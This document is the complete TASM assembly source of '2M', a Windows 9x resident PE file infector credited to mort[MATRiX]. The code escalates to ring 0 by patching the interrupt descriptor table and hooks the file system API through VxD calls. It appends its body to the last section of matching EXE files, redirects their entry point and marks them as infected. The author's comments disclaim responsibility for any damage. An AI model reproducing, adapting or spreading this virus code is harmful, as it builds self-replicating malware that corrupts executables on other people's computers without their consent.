
   ; comment"
   ; 2M - created by mort[MATRiX]
   ;         - simple resident PE infetor
   ;         - no payload (ok,...the last one),...maybe there's no check
   ;           if vir's allready in mem, so it could dec the speed of comp,
   ;           but i didnt check it,...anyway im not responsibile 4 any
   ;           damage it could do
   ;         - compiled in TASM (...)
   ;         - well, 2 many bugs, but i cant c them...
   ;         - and as allways 10x 2 LJ
   ; "


   .586p
   .model flat,stdcall

   extrn               ExitProcess         : proc
   extrn               MessageBoxA         : proc

   _vSize              equ @endOfIT - @mm
   _bufSize            equ 078h

   .data
             db 13,10
             db ' M         M    M         M    ',13,10
             db ' MM       MM    MM       MM    ',13,10
             db ' MMM     MMM    MMM     MMM    ',13,10
             db ' MMMM   MMMM    MMMM   MMMM    ',13,10
             db ' MM MM MM MM    MM MM MM MM    ',13,10
             db ' MM  MMM  MM    MM  MMM  MM    ',13,10
             db ' MM   M   MM    MM   M   MM    ',13,10
             db ' MM       MM    MM       MM    ',13,10
             db ' MM       MM    MM       MM    ',13,10
   .code
   @mm:
             pusha

             sub eax,offset @mm                      ;set delta handle
             pushf
             xchg ebp,eax

             lea eax,[ebp + @returnSEH]              ;set SEH
             push eax
             push dword ptr fs:[0]
             mov fs:[0],esp


             push eax           ;whooops,...'hope this'll b better in future
             sidt [esp - 2]
             pop eax

             add eax,_exception*8          ;set new exception
             xchg eax,esi
             lodsd
             xchg eax,ebx
             lodsd
             xchg ax,bx

             push eax                      ;except. address

             lea eax,[ebp + @r0]
             sub esi,8
             xchg esi,edi
             push edi
             stosw
             shr eax,010h
             add edi,4
             stosw

             mov eax,_vSize + 01000h
             mov word ptr [ebp + _dead],0

             int _exception                ;ok, let's fan begin

             pop edi                       ;set old exception
             pop eax
             stosw
             add edi,4
             shr eax,010h
             stosw

             xchg esi,ecx                  ;jmp to next line
             lodsb

   @returnSEH:
             mov esp,[esp + 8]
             pop dword ptr fs:[0]
             pop edx

   @allreadyInst:
             popf
             popa
             jz @firstGeneration

             mov eax,012345678h  ;set new eax
   _oldIP    equ $ - 4
             jmp eax

   @firstGeneration:
             push 0
             call @@1
             db '.2M - created by mort[MATRiX]',0

   @@1:
             call @@2
             db 'MM - hey, look 4ward 2 the right 1...!',0

   @@2:
             push 0
             call MessageBoxA
             call ExitProcess,0
   ;--------------------------------------------------( data )---------------
   _exception          = 05h               ;exception we use
   _dead               dw 0
   _fileName           db 0110h dup(0)
   _mask               db 'GHOAST.EXE',0   ;file u wanna infect
   _checkSize          = $ - _mask - 1     ;or only extension

   _getHeap            = 040000dh          ;get heap vxd call
   _installFSAH        = 0400067h          ;install file system API hook vxd call
   _UNI2BCS            = 0400041h          ;convert name

   _openAct            = 024h              ;open file action
   _r0fileIO           = 0400032h          ;blablabla,...
   _r0_open            = 0d500h
   _r0_read            = 0d600h
   _r0_write           = 0d601h
   _r0_close           = 0d700h
   ;-----------------------------------( ring 0 entry )----------------------
   @r0:
             push eax                                ;allocate memory
             mov eax,_getHeap
             call @vxd
             pop ebx

             or eax,eax
             jz @noFreeMem

             mov edi,eax                             ;copy virus to mem

             sub eax,offset @mm                      ;set delta in new FSAPI
             mov dword ptr [ebp + _newHandle],eax

             lea esi,[ebp + @mm]
             mov ecx,_vSize
             rep movsb

             push eax

             add eax,offset @virFAPI      ;install new file systemm API hook
             push eax
             mov eax,_installFSAH
             call @vxd
             pop ebx

             pop ebx
             mov dword ptr [ebx + _oldFAPI],eax

   @noFreeMem:
             xor ecx,ecx
             iret
   ;---------------------------------------( inf. buffer )-------------------
   _buffer             db _bufSize dup(0)
   ;---------------------------------------( calling VxDs funcs. )-----------
   @vxd:
             pop dword ptr [ebp + _retAdd]
             mov [ebp + _idVxD],020cdh
             mov [ebp + _f],eax

   _idVxD    dw ?
   _f        dd ?

             mov edi,012345678h
   _retAdd             equ $ - 4
             jmp edi
   ;---------------------------------------( last section 2 b infect...)-----
   _lastSec            label
                                 db 8h dup(0)
             _virtSize           dd ?
             _virtOffs           dd ?
             _physSize           dd ?
             _physOffs           dd ?
                                 dd 0,0,0
             _flags              dd ?
   ;--------------------------------------( virus API hook )-----------------
   @virFAPI:
             push ebp
             mov ebp,esp
             sub esp,020h

             push edi

             mov edi,012345678h
   _newHandle          equ $ - 4

             cmp word ptr [edi + _dead],0deadh
             jz @busyNow

             cmp dword ptr [ebp + 0ch],_openAct
             jnz @busyNow

             call @tryInfect               ;well,...

   @busyNow:
             mov eax,[ebp + 01ch]
             push eax
             mov eax,[ebp + 018h]
             push eax
             mov eax,[ebp + 014h]
             push eax
             mov eax,[ebp + 010h]
             push eax
             mov eax,[ebp + 0ch]
             push eax
             mov eax,[ebp + 08h]
             push eax

             mov eax,012345678h
   _oldFAPI            equ $ - 4
             call dword ptr [eax]

             pop edi

             add esp,018h
             leave
             ret
   ;------------------------( ring 0 file IO )-------------------------------
   @r0fIO:
             int 20h
   _xxx      dd _r0fileIO
             ret
   ;----------------------------------------( whooops )----------------------
   @write:
             pusha
             mov eax,_r0_write

             cmp ecx,_vSize
             jb @eee

             mov word ptr [edi + @r0fIO],020cdh
             mov [edi + _xxx],_r0fileIO

             jmp @eee
   @read:
             pusha
             mov eax,_r0_read
   @eee:
             mov ebx,012345678h
   _fileHandle         equ $ - 4
             call @r0fIO
             popa
             ret
   ;------------------------( open file - let's infect )---------------------
   @tryInfect:
             mov word ptr [edi + _dead],0deadh
             pusha

             xchg edi,esi                  ;delta offset in esi
             lea edi,[esi + _fileName]
             mov eax,[ebp + 010h]
             inc al
             jz @noPath

             add al,03fh
             stosb
             mov al,':'
             stosb

   @noPath:
             push edi

             push 0                        ;nothing 2 say,...
             push 0100h
             mov eax,[ebp + 01ch]
             mov eax,[eax + 0ch]
             add eax,4
             push eax
             push edi
             mov eax,_UNI2BCS

             xchg esi,ebp
             call @vxd
             xchg esi,ebp

             add esp,010h

             pop edi

             add edi,eax
             mov byte ptr [edi],0          ;ASCII -> ASCIIZ

             xchg ebx,esi                  ;change handle / pointer 2 end of name
             lea esi,[ebx + _mask]
             push ebx
             mov ecx,_checkSize            ;well, it's bcoz of file i want 2 infect
             sub edi,ecx
             rep cmpsb
             pop edi                       ;delta offset in edi
             jnz @eou1


             lea esi,[edi + _fileName]     ;let's infect
             mov dx,1
             mov bx,2
             mov eax,_r0_open
             call @r0fIO
             jc @eou1

             mov dword ptr [edi + _fileHandle],eax   ;filehandle

             lea esi,[edi + _buffer]
             mov ecx,_bufSize
             xor edx,edx
             call @read

             cmp word ptr [esi],'ZM'                 ;check EXE
             jnz @closeIT
             cmp word ptr [esi + 038h],'TM'          ;check infection flag
             jz @closeIT                             ;i no it's stupid
             mov eax,[esi + 03ch]

             mov word ptr [esi + 038h],'TM'          ;set inf.flag

             mov ecx,_bufSize
             xor edx,edx
             call @write

             xchg eax,edx                  ;possition of PE header
             mov ecx,_bufSize
             call @read                    ;& read it

             cmp word ptr [esi + eax],'EP'
             jnz @closeIT

             push edx edx                  ;save PE position

             xor eax,eax
             mov ax,[esi + 6]              ;number of secs
             dec eax
             mov ecx,028h
             mul ecx
             add eax,078h
             push eax
             mov eax,[esi + 074h]
             shl eax,3
             pop ebx
             add eax,ebx

             pop edx                       ;read last section header
             add edx,eax
             push edx                      ;last section position
             mov ecx,028h
             lea esi,[edi + _lastSec]
             call @read

             xor edx,edx                   ;and align,...
             mov eax,[edi + _virtSize]
             add eax,_vSize
             mov ecx,dword ptr [edi + _buffer + 038h]
             div ecx
             inc eax
             mul ecx
             mov [edi + _virtSize],eax

             mov eax,[edi + _physSize]
             push eax eax eax
             add eax,_vSize
             mov ecx,dword ptr [edi + _buffer + 03ch]
             div ecx
             inc eax
             mul ecx
             mov [edi + _physSize],eax

             pop ecx
             sub eax,ecx                   ;increase RAW size
             add dword ptr [edi + _buffer + 050h],eax

             xchg eax,ecx        ;number of bytes to write into file

             pop eax
             add eax,[edi + _virtOffs]     ;set old&new IP
             xchg dword ptr [edi + _buffer + 028h],eax

             add eax,dword ptr [edi + _buffer + 034h]          ;add image base
             mov dword ptr [edi + _oldIP],eax

             pop eax             ;old phys size
             add eax,[edi + _physOffs]
             xchg eax,edx
             lea esi,[edi + @mm]
             call @write                   ;write vir's body to file

             or dword ptr [edi + _flags],0a0000020h

             pop edx
             mov ecx,028h
             lea esi,[edi + _lastSec]
             call @write

             pop edx
             mov ecx,_bufSize
             lea esi,[edi + _buffer]
             call @write

   @closeIT:
             mov eax,_r0_close
             mov ebx,dword ptr [edi + _fileHandle]
             call @r0fIO

   @eou1:
             mov word ptr [edi + _dead],0
             popa
             ret

   @endOfIT            label

   end @mm
